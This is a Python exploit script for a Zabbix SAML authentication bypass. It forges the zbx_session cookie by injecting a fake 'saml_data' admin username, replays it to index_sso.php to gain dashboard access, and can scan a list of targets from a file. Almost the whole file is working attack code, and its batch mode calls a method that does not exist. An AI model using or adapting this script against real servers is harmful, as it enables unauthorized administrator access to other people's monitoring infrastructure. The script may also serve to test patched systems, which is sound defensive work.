#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
import base64
urllib3.disable_warnings()


def title():
    print("""
#######     ##    ######   ######    ######  ##   ##            #####      ##    ##   ##   ####             ######   ##  ##   ######      ##     #####    #####   
##   ##    ####    ##  ##   ##  ##     ##     ## ##            ##   ##    ####   ### ###    ##               ##  ##  ##  ##    ##  ##    ####   ##   ##  ##   ##  
    ##    ##  ##   ##  ##   ##  ##     ##      ###             ##        ##  ##  #######    ##               ##  ##  ##  ##    ##  ##   ##  ##  ##       ##       
   ##     ######   #####    #####      ##       #               #####    ######  ## # ##    ##               #####    ####     ##  ##   ######   #####    #####   
  ##      ##  ##   ##  ##   ##  ##     ##      ###                  ##   ##  ##  ##   ##    ##               ##  ##    ##      #####    ##  ##       ##       ##  
 ##  ##   ##  ##   ##  ##   ##  ##     ##     ## ##            ##   ##   ##  ##  ##   ##    ## ##            ##  ##    ##      ##       ##  ##  ##   ##  ##   ##  
#######   ##  ##  ######   ######    ######  ##   ##            #####    ##  ##  ##   ##   ######           ######    ####    ###       ##  ##   #####    #####   
                                                                                                                                                                 

                            
                                     Author: Henry4E36
               """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def get_cookie(self):
        cookie_url = self.url + "/index.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }
        # 获取cookie
        try:
            res = requests.get(url=cookie_url, headers=headers, verify=False, timeout=5)
            if res.status_code == 200:
                cookie = res.headers['Set-Cookie'].split("=")[-1].split(";")[0].replace("%3D", "=")
                # base64解密cookie
                base64_cookie = base64.b64decode(cookie)
                set_cookie = str(base64_cookie, encoding="utf8").replace("{", '{"saml_data":{"username_attribute":"Admin"},').encode("utf-8")
                # base64编码
                saml_cookie = str(base64.b64encode(set_cookie),encoding="utf8")
                print(f"处理后的cookie：{saml_cookie}")
                print("[" + "-"*100 + "]")
                return saml_cookie
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在saml 绕过！")
                print("[" + "-"*100 + "]")
                sys.exit(1)
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！", e)
            print("[" + "-"*100 + "]")
            sys.exit(1)

    def saml_bypass(self, cookie):
        bypass_url = self.url + "/index_sso.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            'Cookie': f'zbx_session={cookie}'
        }
        try:
            res = requests.get(url=bypass_url, headers=headers, verify=False, timeout=5, allow_redirects=False)
            if res.status_code == 302 and res.headers['Location'] == "zabbix.php?action=dashboard.view":
                print("系统存在Zabbix sam bypass")
            else:
                print("系统不存在Zabbix sam bypass")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！", e)
            print("[" + "-"*100 + "]")
            sys.exit(1)



    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='Zabbix Saml Bypass')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 zabbix-saml-bypass.py -u http://127.0.0.1\neg2:>>>python3 zabbix-saml-bypass.py -f ip.txt")
    elif args.url:
        cookie = information(args).get_cookie()
        information(args).saml_bypass(cookie)

    elif args.file:
        information(args).file_url()
